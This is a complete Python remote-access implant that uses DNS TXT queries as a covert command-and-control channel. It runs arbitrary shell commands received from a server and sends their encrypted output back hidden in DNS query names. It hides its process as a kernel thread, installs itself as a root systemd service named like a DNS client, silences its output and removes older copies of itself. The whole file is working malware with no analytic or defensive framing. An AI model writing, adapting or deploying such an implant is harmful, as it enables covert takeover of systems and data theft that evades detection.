import os
import sys
import time
import dns.resolver
import base64
import json
import uuid
import subprocess
import hashlib
import glob
from cryptography.fernet import Fernet

SERVER_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.192.147"
KEY = b'A2Qti2UZdzbp3AdAwAhK23O1xPo-1dW1agEvNyVX8Lc='

ip_hash = hashlib.md5(SERVER_IP.encode()).hexdigest()[:8]
client_id = f"{ip_hash}_{str(uuid.uuid4())[:8]}"
service_name = f"dns-client-{ip_hash}"
service_file = f"/etc/systemd/system/{service_name}.service"


def mask_process_name():
    """Mask the process name to appear as something else in system monitoring"""
    fake_names = [
        "[kworker/0:1]",
        "[ksoftirqd/0]", 
        "[migration/0]",
        "[rcu_sched]",
        "[kthreadd]",
        "[kworker/u8:2]",
        "[systemd]",
        "[kblockd/0]"
    ]
    
    fake_name = fake_names[hash(client_id) % len(fake_names)]
    
    try:
        if hasattr(sys, 'argv'):
            sys.argv[0] = fake_name
            try:
                import ctypes
                import ctypes.util
                libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
                PR_SET_NAME = 15
                libc.prctl(PR_SET_NAME, fake_name.encode(), 0, 0, 0)
            except:
                pass
    except:
        pass


def remove_old_instances():
    """Remove all existing dns-client instances except the current one"""
    if os.geteuid() != 0:
        return  
    try:
        service_pattern = "/etc/systemd/system/dns-client-*.service"
        existing_services = glob.glob(service_pattern)
        
        for service_file_path in existing_services:
            if service_file_path == service_file:
                continue
            
            old_service_name = os.path.basename(service_file_path).replace('.service', '')
            
            try:
                subprocess.run(['systemctl', 'stop', old_service_name], check=False, capture_output=True)
                subprocess.run(['systemctl', 'disable', old_service_name], check=False, capture_output=True)
                
                os.remove(service_file_path)
                
                try:
                    result = subprocess.run(['systemctl', 'show', old_service_name, '--property=MainPID'], 
                                          capture_output=True, text=True)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if line.startswith('MainPID='):
                                pid = line.split('=')[1].strip()
                                if pid and pid != '0':
                                    subprocess.run(['kill', '-9', pid], check=False)
                except:
                    pass
                    
            except:
                pass  
        
        subprocess.run(['systemctl', 'daemon-reload'], check=False, capture_output=True)
        
    except:
        pass  


def setup_autostart():
    """Set up systemd service for auto-start on boot"""
    if os.geteuid() != 0:
        return  
    
    script_path = os.path.abspath(sys.argv[0])
    service_content = f"""[Unit]
Description=DNS Client Service for {SERVER_IP}
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/root
ExecStart=/usr/bin/python3 {script_path} {SERVER_IP}
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
KillMode=process

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/tmp

[Install]
WantedBy=multi-user.target"""
    
    try:
        with open(service_file, 'w') as f:
            f.write(service_content)
        
        subprocess.run(['systemctl', 'daemon-reload'], check=False)
        subprocess.run(['systemctl', 'enable', f'{service_name}.service'], check=False)
        subprocess.run(['systemctl', 'start', f'{service_name}.service'], check=False)
    except:
        pass  


def daemonize():
    if os.fork() > 0:
        sys.exit(0)

    os.setsid()

    if os.fork() > 0:
        sys.exit(0)

    sys.stdout.flush()
    sys.stderr.flush()

    with open("/dev/null", "r") as f:
        os.dup2(f.fileno(), sys.stdin.fileno())

    with open("/dev/null", "a+") as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())


def query_dns(name):
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [SERVER_IP]
    resolver.timeout = 1
    resolver.lifetime = 1

    try:
        answers = resolver.resolve(name + ".", "TXT")
        return answers[0].to_text().strip('"')
    except:
        return None


def get_task():
    response = query_dns(f"{client_id}.heartbeat")
    if not response:
        return None

    try:
        decoded = base64.urlsafe_b64decode(response.encode())
        decrypted = cipher.decrypt(decoded).decode()
        return json.loads(decrypted)
    except:
        return None


def handle_task(task):
    cmd = task.get("task")

    if cmd == "idle":
        return None

    if cmd == "get_info":
        return subprocess.getoutput("uname -a")

    return subprocess.getoutput(cmd)


def send_result(data):
    data = str(data)

    encrypted = cipher.encrypt(data.encode())
    encoded = base64.urlsafe_b64encode(encrypted).decode()

    CHUNK_SIZE = 50
    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total = len(chunks)

    for i, chunk in enumerate(chunks):
        query_dns(f"{chunk}.{i}.{total}.{client_id}.result")


def run():
    while True:
        task = get_task()

        if task:
            result = handle_task(task)
            if result:
                send_result(result)

        time.sleep(3)


if __name__ == "__main__":
    remove_old_instances()
    
    setup_autostart()
    
    mask_process_name()
    
    daemonize()
    run()